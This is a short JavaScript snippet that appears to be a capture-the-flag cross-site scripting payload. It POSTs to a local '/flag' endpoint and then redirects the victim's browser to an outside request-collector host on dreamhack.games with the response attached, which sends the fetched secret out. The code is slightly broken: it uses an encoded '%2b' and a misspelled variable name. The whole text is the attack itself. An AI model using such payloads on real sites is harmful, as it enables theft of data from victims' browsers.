const postData = {
  'admin': 'zzlol'
};

const options = {
  method: 'POST',
  body: postData
};

fetch('http://localhost:8000/flag', options)
  .then(response => location='https://uitfdds.request.dreamhack.games/'%2breponse)
